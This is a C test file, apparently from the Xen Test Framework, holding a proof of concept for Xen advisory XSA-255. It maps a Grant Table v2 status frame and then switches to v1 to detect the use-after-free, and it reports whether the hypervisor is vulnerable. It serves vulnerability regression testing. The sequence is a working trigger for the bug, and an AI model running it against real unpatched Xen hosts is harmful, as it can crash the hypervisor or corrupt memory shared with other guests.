/**
 * @file tests/xsa-255/main.c
 * @ref test-xsa-255
 *
 * @page test-xsa-255 XSA-255
 *
 * Advisory: [XSA-255](https://xenbits.xen.org/xsa/advisory-255.html)
 *
 * The Grant Table v2 API has includes a set of status frames, which the guest
 * is expected to map in addition to the regular grant frames.  These frames
 * need freeing by Xen if a guest chooses to switch back to Grant Table v1.
 * Such a transition would might occur when invoking a crash kernel.
 *
 * Before XSA-255, Xen failed to check for outstanding mappings of the status
 * frames before freeing the underlying pages.
 *
 * Depending on the version of Xen, this might reliably hit a BUG() in the
 * reference counting logic (and is at most a straight DoS), or may allow for
 * the guest to cause worse problems via its writeable mapping to a reused
 * page.
 *
 * @see tests/xsa-255/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-255 PoC";

static uint8_t frame1[PAGE_SIZE] __page_aligned_bss;

void test_main(void)
{
    int rc = xtf_init_grant_table(2);

    if ( rc == -ENOENT )
        return xtf_skip("Skip: Grant Table v2 not available\n");
    if ( rc )
        return xtf_error("Error initialising grant table: %d\n", rc);

    /* Retrieve the status frames from Xen. */
    uint64_t status_frames[1] = {};
    struct gnttab_get_status_frames gsf = {
        .dom = DOMID_SELF,
        .nr_frames = ARRAY_SIZE(status_frames),
        .frame_list = status_frames,
    };

    rc = hypercall_grant_table_op(GNTTABOP_get_status_frames, &gsf, 1);
    if ( rc || gsf.status )
        return xtf_error("Error: unable to obtain status frames: %d,%d\n",
                         rc, gsf.status);

    /* Remap frame1 to point at the first status frame. */
    rc = hypercall_update_va_mapping(
        _u(frame1), pte_from_gfn(status_frames[0], PF_SYM(AD, P)), UVMF_INVLPG);
    if ( rc )
        return xtf_error("Error: unable to map status frame: %d\n", rc);

    /* Switch back to Grant Table v1, implicitly freeing the status frames. */
    struct gnttab_set_version version = { 1 };

    rc = hypercall_grant_table_op(GNTTABOP_set_version, &version, 1);
    switch ( rc )
    {
    case 0:
        return xtf_failure("Fail: Vulnerable to XSA-255\n");

    case -EBUSY:
        /* Probably not vulnerable.  Try to confirm. */
        break;

    default:
        return xtf_error("Error: Unexpected set_version result %d\n", rc);
    }

    /* Unmap the status frame. */
    rc = hypercall_update_va_mapping(_u(frame1), 0, UVMF_INVLPG);
    if ( rc )
        return xtf_error("Error unmapping status frame: %d\n", rc);

    /* Retry the switch back to Grant Table v1. */
    rc = hypercall_grant_table_op(GNTTABOP_set_version, &version, 1);
    if ( rc )
        return xtf_error("Error setting gnttab version: %d\n", rc);

    xtf_success("Success: Not vulnerable to XSA-255\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
